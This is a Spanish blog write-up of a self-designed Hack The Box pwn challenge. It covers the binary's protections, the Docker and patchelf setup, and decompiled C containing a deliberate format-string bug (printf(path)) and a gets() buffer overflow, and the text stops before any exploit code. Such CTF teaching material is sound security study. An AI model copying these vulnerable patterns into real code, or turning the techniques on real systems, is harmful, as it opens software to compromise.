<!doctype html><html lang="es"><head><title>FileStorage | 7Rocky</title>
<meta charset="utf-8"><meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1"><meta name="author" content="Blog de 7Rocky. Ciberseguridad y Mates"><meta name="description" content="Binario de 64 bits. _Buffer Overflow_. Vulnerabilidad de _Format String_. FSOP. Sobrescritura de la GOT"><meta name="image" content="https://7rocky.github.io/images/pwn.png"><meta name="robots" content="index, follow"><meta name="viewport" content="width=device-width,minimum-scale=1"><meta itemprop="description" content="Binario de 64 bits. _Buffer Overflow_. Vulnerabilidad de _Format String_. FSOP. Sobrescritura de la GOT"><meta itemprop="keywords" content><meta itemprop="name" content="FileStorage"><meta property="article:published_time" content><meta property="og:author" content="Blog de 7Rocky. Ciberseguridad y Mates"><meta property="og:description" content="Binario de 64 bits. _Buffer Overflow_. Vulnerabilidad de _Format String_. FSOP. Sobrescritura de la GOT"><meta property="og:image" content="https://7rocky.github.io/images/pwn.png"><meta property="og:locale" content="es_ES"><meta property="og:site_name" content="Blog de 7Rocky. Ciberseguridad y Mates"><meta property="og:title" content="FileStorage"><meta property="og:type" content="website"><meta property="og:url" content="https://7rocky.github.io/ctf/htb-challenges/pwn/filestorage/"><meta name="twitter:author" content="Blog de 7Rocky. Ciberseguridad y Mates"><meta name="twitter:card" content="Binario de 64 bits. _Buffer Overflow_. Vulnerabilidad de _Format String_. FSOP. Sobrescritura de la GOT"><meta name="twitter:description" content="Binario de 64 bits. _Buffer Overflow_. Vulnerabilidad de _Format String_. FSOP. Sobrescritura de la GOT"><meta name="twitter:image" content="https://7rocky.github.io/images/pwn.png"><meta name="twitter:title" content="FileStorage"><link href="/favicon.ico" rel="shortcut icon" type="image/x-icon"><link href="/css/style.css" rel="stylesheet"><link href="/css/main.css" rel="stylesheet"><link href="/css/code.css" rel="stylesheet"><link href="https://7rocky.github.io/ctf/htb-challenges/pwn/filestorage/" rel="canonical"><script async src="https://www.googletagmanager.com/gtag/js?id=G-Z1HQGH3M4D"></script><script>var doNotTrack=!1;if(!doNotTrack){window.dataLayer=window.dataLayer||[];function gtag(){dataLayer.push(arguments)}gtag("js",new Date),gtag("config","G-Z1HQGH3M4D",{anonymize_ip:!1})}</script></head><body class="ma0 production"><header style="position:sticky;top:0;z-index:9"><div class="bg-black"><nav class="ph4-ns" id="navigation" role="navigation"><div class="flex-l justify-between items-center center"><a class="f3 fw2 hover-white no-underline white-90 dib" href="/" title="7Rocky">7Rocky</a><div class="flex-l items-center"><a href="/search" target class="link-transition link dib z-999 pt3 pt0-l mr1 search-link" title="Buscar" rel="noopener" aria-label="Buscar"><svg height="30" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" viewBox="0 0 487.95 487.95" style="enable-background:new 0 0 487.95 487.95"><g><g><path d="M481.8 453l-140-140.1c27.6-33.1 44.2-75.4 44.2-121.6C386 85.9 299.5.2 193.1.2S0 86 0 191.4s86.5 191.1 192.9 191.1c45.2.0 86.8-15.5 119.8-41.4l140.5 140.5c8.2 8.2 20.4 8.2 28.6.0C490 473.4 490 461.2 481.8 453zM41 191.4c0-82.8 68.2-150.1 151.9-150.1s151.9 67.3 151.9 150.1-68.2 150.1-151.9 150.1S41 274.1 41 191.4z" style="fill-rule:evenodd;clip-rule:evenodd;fill:#a9a9b3"/></g></g><g/><g/><g/><g/><g/><g/><g/><g/><g/><g/><g/><g/><g/><g/><g/></svg></a><a class="link-transition lang link dib z-999 pt3 pt0-l mr3" href="#" title="es"><img alt="es" height="30px" src="/images/es.png" width="30px">
</a><a class="link-transition lang link dib z-999 pt3 pt0-l" href="/en/ctf/htb-challenges/pwn/filestorage/" title="en"><img alt="en" height="30px" src="/images/en.png" style="border:4px solid#000;border-radius:100%" width="30px"></a><ul class="pl0 ml3 mr3" style="line-height:30px"><li class="list f5 f4-ns fw4 dib pr2 pl2"><a class="hover-white no-underline white-90" href="/ctf/" title="CTF">CTF</a></li><li class="list f5 f4-ns fw4 dib pr2 pl2"><a class="hover-white no-underline white-90" href="/htb/" title="HTB">HTB</a></li><li class="list f5 f4-ns fw4 dib pr2 pl2"><a class="hover-white no-underline white-90" href="/imc/" title="IMC">IMC</a></li></ul><a href="https://www.linkedin.com/in/roberto-gesteira-minarro/" target="_blank" class="link-transition linkedin link dib z-999 pt3 pt0-l mr1" title="LinkedIn link" rel="noopener" aria-label="follow on LinkedIn——Opens in a new window"><svg height="30" style="enable-background:new 0 0 65 65" viewBox="0 0 65 65" width="30" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M50.837 48.137V36.425c0-6.275-3.35-9.195-7.816-9.195-3.604.0-5.219 1.983-6.119 3.374V27.71h-6.79c.09 1.917.0 20.427.0 20.427h6.79V36.729c0-.609.044-1.219.224-1.655.49-1.22 1.607-2.483 3.482-2.483 2.458.0 3.44 1.873 3.44 4.618v10.929H50.837zM22.959 24.922c2.367.0 3.842-1.57 3.842-3.531-.044-2.003-1.475-3.528-3.797-3.528s-3.841 1.524-3.841 3.528c0 1.961 1.474 3.531 3.753 3.531H22.959zM34 64C17.432 64 4 50.568 4 34 4 17.431 17.432 4 34 4s30 13.431 30 30c0 16.568-13.432 30-30 30zM26.354 48.137V27.71h-6.789v20.427h6.789z" style="fill-rule:evenodd;clip-rule:evenodd;fill:"/></svg><span class="new-window"><svg height="8" style="enable-background:new 0 0 1000 1000" viewBox="0 0 1e3 1e3" width="8" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M598 128h298v298h-86V274L392 692l-60-60 418-418H598v-86zM810 810V512h86v298c0 46-40 86-86 86H214c-48 0-86-40-86-86V214c0-46 38-86 86-86h298v86H214v596h596z" style="fill-rule:evenodd;clip-rule:evenodd;fill:"/></svg></span></a><a href="https://github.com/7Rocky" target="_blank" class="link-transition github link dib z-999 pt3 pt0-l mr1" title="GitHub link" rel="noopener" aria-label="follow on GitHub——Opens in a new window"><svg height="30" style="enable-background:new 0 0 512 512" viewBox="0 0 512 512" width="30" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M256 32C132.3 32 32 134.8 32 261.7c0 101.5 64.2 187.5 153.2 217.9 11.2 2.1 15.3-5 15.3-11.1.0-5.5-.2-19.9-.3-39.1-62.3 13.9-75.5-30.8-75.5-30.8-10.2-26.5-24.9-33.6-24.9-33.6-20.3-14.3 1.5-14 1.5-14 22.5 1.6 34.3 23.7 34.3 23.7 20 35.1 52.4 25 65.2 19.1 2-14.8 7.8-25 14.2-30.7-49.7-5.8-102-25.5-102-113.5.0-25.1 8.7-45.6 23-61.6-2.3-5.8-10-29.2 2.2-60.8.0.0 18.8-6.2 61.6 23.5 17.9-5.1 37-7.6 56.1-7.7 19 .1 38.2 2.6 56.1 7.7 42.8-29.7 61.5-23.5 61.5-23.5 12.2 31.6 4.5 55 2.2 60.8 14.3 16.1 23 36.6 23 61.6.0 88.2-52.4 107.6-102.3 113.3 8 7.1 15.2 21.1 15.2 42.5.0 30.7-.3 55.5-.3 63 0 6.1 4 13.3 15.4 11C415.9 449.1 480 363.1 480 261.7 480 134.8 379.7 32 256 32z"/></svg><span class="new-window"><svg height="8" style="enable-background:new 0 0 1000 1000" viewBox="0 0 1e3 1e3" width="8" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M598 128h298v298h-86V274L392 692l-60-60 418-418H598v-86zM810 810V512h86v298c0 46-40 86-86 86H214c-48 0-86-40-86-86V214c0-46 38-86 86-86h298v86H214v596h596z" style="fill-rule:evenodd;clip-rule:evenodd;fill:"/></svg></span></a></div></div></nav></div></header><main class="pb5" role="main" style="min-height:720px"><article class="flex-l flex-wrap justify-between mw8 center ph3"><header class="mt4 w-80-l"><a aria-label="aside" class="instapaper_ignoref b tracked" href="../" style="font-size:1.2rem">&lt;- PWN</a><div id="sharing" class="mt3"><a aria-label="share on Facebook" class="facebook no-underline" href="https://www.facebook.com/sharer.php?u=https://7rocky.github.io/ctf/htb-challenges/pwn/filestorage/" title="share on Facebook"><svg height="32" style="enable-background:new 0 0 67 67" viewBox="0 0 67 67" width="32" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M28.765 50.32h6.744V33.998h4.499l.596-5.624h-5.095l.007-2.816c0-1.466.14-2.253 2.244-2.253h2.812V17.68h-4.5c-5.405.0-7.307 2.729-7.307 7.317v3.377h-3.369v5.625h3.369V50.32zM33 64C16.432 64 3 50.569 3 34S16.432 4 33 4s30 13.431 30 30S49.568 64 33 64z" style="fill-rule:evenodd;clip-rule:evenodd"/></svg></a><a aria-label="share on Twitter" class="twitter no-underline" href="https://twitter.com/share?url=https://7rocky.github.io/ctf/htb-challenges/pwn/filestorage/&amp;text=FileStorage" title="share on Twitter"><svg height="32" style="enable-background:new 0 0 67 67" viewBox="0 0 67 67" width="32" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M37.167 22.283c-2.619.953-4.274 3.411-4.086 6.101l.063 1.038-1.048-.127c-3.813-.487-7.145-2.139-9.974-4.915l-1.383-1.377-.356 1.017c-.754 2.267-.272 4.661 1.299 6.271.838.89.649 1.017-.796.487-.503-.169-.943-.296-.985-.233-.146.149.356 2.076.754 2.839.545 1.06 1.655 2.097 2.871 2.712l1.027.487-1.215.021c-1.173.0-1.215.021-1.089.467.419 1.377 2.074 2.839 3.918 3.475l1.299.444-1.131.678c-1.676.976-3.646 1.526-5.616 1.568C19.775 43.256 19 43.341 19 43.405c0 .211 2.557 1.397 4.044 1.864 4.463 1.377 9.765.783 13.746-1.568 2.829-1.673 5.657-5 6.978-8.221.713-1.716 1.425-4.851 1.425-6.354.0-.975.063-1.102 1.236-2.267.692-.678 1.341-1.419 1.467-1.631.21-.403.188-.403-.88-.043-1.781.636-2.033.551-1.152-.402.649-.678 1.425-1.907 1.425-2.267.0-.063-.314.042-.671.233-.377.212-1.215.53-1.844.72l-1.131.361-1.027-.7c-.566-.381-1.361-.805-1.781-.932C39.766 21.902 38.131 21.944 37.167 22.283zM33 64C16.432 64 3 50.569 3 34S16.432 4 33 4s30 13.431 30 30S49.568 64 33 64z" style="fill-rule:evenodd;clip-rule:evenodd;fill:"/></svg></a><a aria-label="share on LinkedIn" class="linkedin no-underline" href="https://www.linkedin.com/shareArticle?mini=true&amp;url=https://7rocky.github.io/ctf/htb-challenges/pwn/filestorage/&amp;title=FileStorage" title="share on LinkedIn"><svg height="32" style="enable-background:new 0 0 65 65" viewBox="0 0 65 65" width="32" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M50.837 48.137V36.425c0-6.275-3.35-9.195-7.816-9.195-3.604.0-5.219 1.983-6.119 3.374V27.71h-6.79c.09 1.917.0 20.427.0 20.427h6.79V36.729c0-.609.044-1.219.224-1.655.49-1.22 1.607-2.483 3.482-2.483 2.458.0 3.44 1.873 3.44 4.618v10.929H50.837zM22.959 24.922c2.367.0 3.842-1.57 3.842-3.531-.044-2.003-1.475-3.528-3.797-3.528s-3.841 1.524-3.841 3.528c0 1.961 1.474 3.531 3.753 3.531H22.959zM34 64C17.432 64 4 50.568 4 34 4 17.431 17.432 4 34 4s30 13.431 30 30c0 16.568-13.432 30-30 30zM26.354 48.137V27.71h-6.789v20.427h6.789z" style="fill-rule:evenodd;clip-rule:evenodd;fill:"/></svg></a></div><h1 class="f1 mt3 mb1">FileStorage</h1><p class="mb4 f6 dib tracked">22 minutos de lectura</p></header><aside aria-label="aside" class="w-20-l mt6-l aside-mobile"><div class="bg-card pa3 nested-list-reset nested-copy-line-height nested-links" style="position:sticky;top:5rem;padding-bottom:0"><p class="f5 b pb2" style="border-bottom:5px solid var(--background);margin:0">Contenidos</p><nav id="TableOfContents"><ul><li><a href="#configuración-del-entorno">Configuración del entorno</a></li><li><a href="#ingeniería-inversa">Ingeniería inversa</a><ul><li><a href="#encontrando-vulnerabilidades">Encontrando vulnerabilidades</a></li></ul></li><li><a href="#estrategia-de-explotación">Estrategia de explotación</a><ul><li><a href="#fsop">FSOP</a></li></ul></li><li><a href="#desarrollo-del-_exploit_">Desarrollo del <em>exploit</em></a><ul><li><a href="#sin-aslr">Sin ASLR</a></li><li><a href="#con-aslr">Con ASLR</a></li></ul></li><li><a href="#_flag_"><em>Flag</em></a></li><li><a href="#vía-no-intencionada">Vía no intencionada</a></li></ul></nav><div class="bg-card" style="border-top:5px solid var(--background)"><a class="bmc-btn w-100" target="_blank" href="http://buymeacoffee.com/7Rocky" style="padding:0" title="Buy me a beer">🍺 <span class="bmc-btn-text" style="font-family:Cookie!important;color:#fff">Buy me a beer</span></a></div></div></aside><div class="nested-copy-line-height lh-copy serif f4 nested-links nested-img pr4-l w-80-l"><p>Este es un reto que diseñé para Hack the Box. Se nos proporciona un binario de 64 bits llamado <code>file_storage</code>:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight">Arch:     amd64-64-little
RELRO:    <span class="code-dark-yellow">Partial RELRO</span>
Stack:    <span class="code-dark-red">No canary found</span>
NX:       <span class="code-dark-green">NX enabled</span>
PIE:      <span class="code-dark-red">No PIE (0x400000)</span>  
</code></pre></div><p>Vemos que tiene NX habilitado, por lo que no podemos ejecutar <em>shellcode</em> personalizado en la pila directamente. Además, tiene <em>Partial</em> RELRO, lo que significa que la Tabla de <em>Offsets</em> Globales (GOT) puede modificarse de algunas maneras.</p><p>No hay PIE ni canarios de pila (<em>stack canaries</em>), por lo que habrá que realizar menos pasos para la explotación. Probablemente, solo necesitaremos eludir ASLR.</p><h2 id="configuración-del-entorno">Configuración del entorno</h2><p>Tenemos un <code>Dockerfile</code>, que presumiblemente será la instancia remota:</p><div class="highlight"><pre tabindex="0" style="color:#fff;background-color:#1d1e19;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="mtk5">FROM</span><span class="mtk1"> ubuntu@sha256:a06ae92523384c2cd182dcfe7f8b2bf0907</span><span class="mtk1">5062e937d5653d7d0db0375ad2221</span>
<span class="mtk5">EXPOSE</span><span class="mtk1"> 1337</span>
<span class="mtk5">RUN</span><span class="mtk1"> apt update &amp;&amp; apt install -y socat &amp;&amp; rm -rf /var</span><span class="mtk1">/lib/apt/lists/*</span>  
<span class="mtk5">RUN</span><span class="mtk1"> useradd --user-group --system --no-log-init ctf</span>
<span class="mtk5">USER</span><span class="mtk1"> ctf</span>
<span class="mtk5">WORKDIR</span><span class="mtk1"> /home/ctf</span>
<span class="mtk5">COPY</span><span class="mtk1"> challenge/file_storage challenge/flag.txt ./</span>
<span class="mtk5">ENTRYPOINT</span><span class="mtk1"> [</span><span class="mtk4">"socat"</span><span class="mtk1">, </span><span class="mtk4">"tcp-l:1337,reuseaddr,fork"</span><span class="mtk1">, </span><span class="mtk4">"EXEC:/home/ctf/file_storage"</span><span class="mtk1">]</span>
</code></pre></div><p>Por lo tanto, podemos obtener la librería y el cargador de Glibc remoto y parchear el binario para que se ejecute en el mismo entorno usando <code>patchelf</code>:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">docker</span> run --rm -v <span class="code-dark-yellow">"<span class="code-dark-magenta">$(<span class="code-dark-green">pwd</span>)</span>:/opt"</span> -it ubuntu@sha256:a06ae92523384c2cd182dcfe7f8b2bf09075062e937d5653d7d0db0375ad2221 bash  
root@a7cd55033e42:/# ldd /bin/sh
	libc.so.6 =&gt; /lib/x86_64-linux-gnu/libc.so.6 (0x0000004001858000)
	/lib64/ld-linux-x86-64.so.2 (0x0000004000000000)
root@a7cd55033e42:/# cp /lib/x86_64-linux-gnu/libc.so.6 /opt
root@a7cd55033e42:/# cp /lib64/ld-linux-x86-64.so.2 /opt
root@a7cd55033e42:/# exit
exit

<span class="code-cyan">$</span> <span class="code-dark-green">chmod</span> +x <span class="mtku">ld-linux-x86-64.so.2</span> <span class="mtku">libc.so.6</span>

<span class="code-cyan">$</span> <span class="code-dark-green">patchelf</span> --set-rpath <span class="mtku">.</span> <span class="mtku">file_storage</span>

<span class="code-cyan">$</span> <span class="code-dark-green">patchelf</span> --set-interpreter <span class="mtku">ld-linux-x86-64.so.2</span> <span class="mtku">file_storage</span>

<span class="code-cyan">$</span> <span class="code-dark-green">ldd</span> <span class="mtku">file_storage</span>
        linux-vdso.so.1 (0x00007ffdfff6e000)
        libc.so.6 =&gt; ./libc.so.6 (0x00007fd0f1249000)
        ld-linux-x86-64.so.2 =&gt; /lib64/ld-linux-x86-64.so.2 (0x00007fd0f143d000)

<span class="code-cyan">$</span> <span class="code-dark-green">./file_storage</span>
Welcome to my File Storage (beta):

1. Read contents from a file
2. Write data into a random file
3. Exit
&gt; ^C
</code></pre></div><h2 id="ingeniería-inversa">Ingeniería inversa</h2><p>Descompilaremos el binario usando una herramienta de ingeniería inversa como Ghidra. Esta es la función <code>main</code>:</p><div class="highlight"><pre tabindex="0" style="color:#fff;background-color:#1d1e19;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="mtk7 mtki">void</span><span class="mtk1"> </span><span class="mtk8">main</span><span class="mtk1">() {</span>
<span class="mtk1">  </span><span class="mtk7 mtki">int</span><span class="mtk1"> ret;</span>
<span class="mtk1">  </span><span class="mtk7 mtki">time_t</span><span class="mtk1"> t;</span>
<span class="mtk1">  </span><span class="mtk7 mtki">char</span><span class="mtk1"> </span><span class="mtk5">*</span><span class="mtk1">index;</span>
<span class="mtk1">  </span><span class="mtk7 mtki">size_t</span><span class="mtk1"> length;</span>
<span class="mtk1">  </span><span class="mtk7 mtki">char</span><span class="mtk1"> content[</span><span class="mtk6">256</span><span class="mtk1">];</span>
<span class="mtk1">  </span><span class="mtk7 mtki">char</span><span class="mtk1"> path[</span><span class="mtk6">16</span><span class="mtk1">];</span>
<span class="mtk1">  </span><span class="mtk7 mtki">char</span><span class="mtk1"> type[</span><span class="mtk6">7</span><span class="mtk1">];</span>
<span class="mtk1">  </span><span class="mtk7 mtki">char</span><span class="mtk1"> filename[</span><span class="mtk6">9</span><span class="mtk1">];</span>
<span class="mtk1">  FILE </span><span class="mtk5">*</span><span class="mtk1">fp;</span>
<span class="mtk1">  </span><span class="mtk7 mtki">int</span><span class="mtk1"> option;</span>
<span class="mtk1">  </span>
<span class="mtk1">  </span><span class="mtk8">setbuf</span><span class="mtk1">(stdout, (</span><span class="mtk7 mtki">char</span><span class="mtk1"> </span><span class="mtk5">*</span><span class="mtk1">) </span><span class="mtk5">0x</span><span class="mtk6">0</span><span class="mtk1">);</span>
<span class="mtk1">  t </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk8">time</span><span class="mtk1">((</span><span class="mtk7 mtki">time_t</span><span class="mtk1"> </span><span class="mtk5">*</span><span class="mtk1">) </span><span class="mtk5">0x</span><span class="mtk6">0</span><span class="mtk1">);</span>
<span class="mtk1">  </span><span class="mtk8">srand</span><span class="mtk1">((</span><span class="mtk7 mtki">uint</span><span class="mtk1">) t);</span>
<span class="mtk1">  </span><span class="mtk8">puts</span><span class="mtk1">(</span><span class="mtk4">"Welcome to my File Storage (beta):"</span><span class="mtk1">);</span>

<span class="mtk1">  </span><span class="mtk5">do</span><span class="mtk1"> {</span>
<span class="mtk1">    option </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk8">menu</span><span class="mtk1">();</span>

<span class="mtk1">    </span><span class="mtk5">if</span><span class="mtk1"> (option </span><span class="mtk5">==</span><span class="mtk1"> </span><span class="mtk6">1</span><span class="mtk1">) {</span>
<span class="mtk1">      </span><span class="mtk8">printf</span><span class="mtk1">(</span><span class="mtk4">"Filename: "</span><span class="mtk1">);</span>
<span class="mtk1">      </span><span class="mtk8">fgets</span><span class="mtk1">(filename </span><span class="mtk5">+</span><span class="mtk1"> </span><span class="mtk6">1</span><span class="mtk1">, </span><span class="mtk6">8</span><span class="mtk1">, stdin);</span>
<span class="mtk1">      index </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk8">strstr</span><span class="mtk1">(filename </span><span class="mtk5">+</span><span class="mtk1"> </span><span class="mtk6">1</span><span class="mtk1">, </span><span class="mtk4">"txt"</span><span class="mtk1">);</span>

<span class="mtk1">      </span><span class="mtk5">if</span><span class="mtk1"> (index </span><span class="mtk5">==</span><span class="mtk1"> (</span><span class="mtk7 mtki">char</span><span class="mtk1"> </span><span class="mtk5">*</span><span class="mtk1">) </span><span class="mtk5">0x</span><span class="mtk6">0</span><span class="mtk1">) {</span>
<span class="mtk1">        </span><span class="mtk8">puts</span><span class="mtk1">(</span><span class="mtk4">"Error: Only </span><span class="mtk6">\'</span><span class="mtk4">.txt</span><span class="mtk6">\'</span><span class="mtk4"> files are allowed"</span><span class="mtk1">);</span>
<span class="mtk1">        option </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk6">0</span><span class="mtk1">;</span>
<span class="mtk1">      } </span><span class="mtk5">else</span><span class="mtk1"> {</span>
<span class="mtk1">        length </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk8">strlen</span><span class="mtk1">(filename </span><span class="mtk5">+</span><span class="mtk1"> </span><span class="mtk6">1</span><span class="mtk1">);</span>
<span class="mtk1">        filename[length] </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk4">'</span><span class="mtk6">\0</span><span class="mtk4">'</span><span class="mtk1">;</span>
<span class="mtk1">        </span><span class="mtk8">sprintf</span><span class="mtk1">(path, </span><span class="mtk4">"/tmp/</span><span class="mtk6">%s</span><span class="mtk4">"</span><span class="mtk1">, filename </span><span class="mtk5">+</span><span class="mtk1"> </span><span class="mtk6">1</span><span class="mtk1">);</span>
<span class="mtk1">        fp </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk8">fopen</span><span class="mtk1">(path, </span><span class="mtk4">"r"</span><span class="mtk1">);</span>

<span class="mtk1">        </span><span class="mtk5">if</span><span class="mtk1"> (fp </span><span class="mtk5">==</span><span class="mtk1"> (FILE </span><span class="mtk5">*</span><span class="mtk1">) </span><span class="mtk5">0x</span><span class="mtk6">0</span><span class="mtk1">) {</span>
<span class="mtk1">          </span><span class="mtk8">printf</span><span class="mtk1">(</span><span class="mtk4">"Error: File not found. Please try again</span><span class="mtk6">\n</span><span class="mtk4">Debug: "</span><span class="mtk1">);</span>  
<span class="mtk1">          </span><span class="mtk8">printf</span><span class="mtk1">(path);</span>
<span class="mtk1">          option </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk6">0</span><span class="mtk1">;</span>
<span class="mtk1">        } </span><span class="mtk5">else</span><span class="mtk1"> {</span>
<span class="mtk1">          </span><span class="mtk8">printf</span><span class="mtk1">(</span><span class="mtk4">"What</span><span class="mtk6">\'</span><span class="mtk4">s in the file? (string/number): "</span><span class="mtk1">);</span>
<span class="mtk1">          </span><span class="mtk8">fgets</span><span class="mtk1">(type ,</span><span class="mtk6">8</span><span class="mtk1">, stdin);</span>
<span class="mtk1">          ret </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk8">strcmp</span><span class="mtk1">(</span><span class="mtk4">"string</span><span class="mtk6">\n</span><span class="mtk4">"</span><span class="mtk1">, type);</span>

<span class="mtk1">          </span><span class="mtk5">if</span><span class="mtk1"> (ret </span><span class="mtk5">==</span><span class="mtk1"> </span><span class="mtk6">0</span><span class="mtk1">) {</span>
<span class="mtk1">            </span><span class="mtk8">__isoc99_fscanf</span><span class="mtk1">(fp, </span><span class="mtk4">" </span><span class="mtk6">%s</span><span class="mtk4">"</span><span class="mtk1">, content);</span>
<span class="mtk1">            </span><span class="mtk8">puts</span><span class="mtk1">(content);</span>
<span class="mtk1">          } </span><span class="mtk5">else</span><span class="mtk1"> {</span>
<span class="mtk1">            ret </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk8">strcmp</span><span class="mtk1">(</span><span class="mtk4">"number</span><span class="mtk6">\n</span><span class="mtk4">"</span><span class="mtk1">, type);</span>

<span class="mtk1">            </span><span class="mtk5">if</span><span class="mtk1"> (ret </span><span class="mtk5">!=</span><span class="mtk1"> </span><span class="mtk6">0</span><span class="mtk1">) {</span>
<span class="mtk1">              </span><span class="mtk8">puts</span><span class="mtk1">(</span><span class="mtk4">"Error: Bad file content"</span><span class="mtk1">);</span>
<span class="mtk1">              </span><span class="mtk8">fclose</span><span class="mtk1">(fp);</span>
<span class="mtk3">                    /* WARNING: Subroutine does no</span><span class="mtk3">t return */</span>
<span class="mtk1">              </span><span class="mtk8">exit</span><span class="mtk1">(</span><span class="mtk6">1</span><span class="mtk1">);</span>
<span class="mtk1">            }</span>

<span class="mtk1">            </span><span class="mtk8">__isoc99_fscanf</span><span class="mtk1">(fp, </span><span class="mtk4">" </span><span class="mtk6">%s</span><span class="mtk4">"</span><span class="mtk1">, content);</span>
<span class="mtk1">            ret </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk8">atoi</span><span class="mtk1">(content);</span>
<span class="mtk1">            </span><span class="mtk8">puts</span><span class="mtk1">((</span><span class="mtk7 mtki">char</span><span class="mtk1"> </span><span class="mtk5">*</span><span class="mtk1">) (</span><span class="mtk7 mtki">long</span><span class="mtk1">) ret);</span>
<span class="mtk1">          }</span>

<span class="mtk1">          </span><span class="mtk8">fclose</span><span class="mtk1">(fp);</span>
<span class="mtk1">          </span><span class="mtk8">printf</span><span class="mtk1">(</span><span class="mtk4">"Do you want to write something? (yes/no): "</span><span class="mtk1">);</span>
<span class="mtk1">          </span><span class="mtk8">fgets</span><span class="mtk1">(type, </span><span class="mtk6">8</span><span class="mtk1">, stdin);</span>
<span class="mtk1">          ret </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk8">strcmp</span><span class="mtk1">(</span><span class="mtk4">"yes</span><span class="mtk6">\n</span><span class="mtk4">"</span><span class="mtk1">, type);</span>

<span class="mtk1">          </span><span class="mtk5">if</span><span class="mtk1"> (ret </span><span class="mtk5">==</span><span class="mtk1"> </span><span class="mtk6">0</span><span class="mtk1">) </span><span class="mtk5">goto</span><span class="mtk1"> LAB_0040170f;</span>
<span class="mtk1">        }</span>
<span class="mtk1">      }</span>
<span class="mtk1">    } </span><span class="mtk5">else</span><span class="mtk1"> </span><span class="mtk5">if</span><span class="mtk1"> (option </span><span class="mtk5">==</span><span class="mtk1"> </span><span class="mtk6">2</span><span class="mtk1">) {</span>
<span class="mtk1">LAB_0040170f:</span>
<span class="mtk1">      </span><span class="mtk8">generate</span><span class="mtk1">(path);</span>
<span class="mtk1">      fp </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk8">fopen</span><span class="mtk1">(path, </span><span class="mtk4">"w"</span><span class="mtk1">);</span>

<span class="mtk1">      </span><span class="mtk5">if</span><span class="mtk1"> (fp </span><span class="mtk5">==</span><span class="mtk1"> (FILE </span><span class="mtk5">*</span><span class="mtk1">) </span><span class="mtk5">0x</span><span class="mtk6">0</span><span class="mtk1">) {</span>
<span class="mtk1">        </span><span class="mtk8">puts</span><span class="mtk1">(</span><span class="mtk4">"fopen() error"</span><span class="mtk1">);</span>
<span class="mtk3">                    /* WARNING: Subroutine does no</span><span class="mtk3">t return */</span>
<span class="mtk1">        </span><span class="mtk8">exit</span><span class="mtk1">(</span><span class="mtk6">1</span><span class="mtk1">);</span>
<span class="mtk1">      }</span>

<span class="mtk1">      </span><span class="mtk8">puts</span><span class="mtk1">(</span><span class="mtk4">"Enter content:"</span><span class="mtk1">);</span>
<span class="mtk1">      </span><span class="mtk8">gets</span><span class="mtk1">(content);</span>
<span class="mtk1">      </span><span class="mtk8">fprintf</span><span class="mtk1">(fp, </span><span class="mtk4">" </span><span class="mtk6">%s</span><span class="mtk4">"</span><span class="mtk1">, content);</span>
<span class="mtk1">      </span><span class="mtk8">fclose</span><span class="mtk1">(fp);</span>
<span class="mtk1">    } </span><span class="mtk5">else</span><span class="mtk1"> {</span>
<span class="mtk1">      </span><span class="mtk8">puts</span><span class="mtk1">(</span><span class="mtk4">"Bye!"</span><span class="mtk1">);</span>
<span class="mtk1">    }</span>

<span class="mtk1">    </span><span class="mtk5">if</span><span class="mtk1"> (option </span><span class="mtk5">!=</span><span class="mtk1"> </span><span class="mtk6">0</span><span class="mtk1">) {</span>
<span class="mtk1">      </span><span class="mtk8">puts</span><span class="mtk1">(</span><span class="mtk4">"Cleaning files..."</span><span class="mtk1">);</span>
<span class="mtk1">      </span><span class="mtk8">sleep</span><span class="mtk1">(</span><span class="mtk6">5</span><span class="mtk1">);</span>
<span class="mtk1">      </span><span class="mtk8">system</span><span class="mtk1">(</span><span class="mtk4">"rm /tmp/??.txt 2&gt;/dev/null"</span><span class="mtk1">);</span>
<span class="mtk3">                    /* WARNING: Subroutine does no</span><span class="mtk3">t return */</span>
<span class="mtk1">      </span><span class="mtk8">exit</span><span class="mtk1">(</span><span class="mtk6">0</span><span class="mtk1">);</span>
<span class="mtk1">    }</span>
<span class="mtk1">  } </span><span class="mtk5">while</span><span class="mtk1"> (</span><span class="mtk6">true</span><span class="mtk1">);</span>
<span class="mtk1">}</span>
</code></pre></div><p>Básicamente, proporciona un menú con estas pocas funciones:</p><div class="highlight"><pre tabindex="0" style="color:#fff;background-color:#1d1e19;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="mtk1">undefined4 </span><span class="mtk8">menu</span><span class="mtk1">() {</span>
<span class="mtk1">  undefined4 local_c;</span>
<span class="mtk1">  </span>
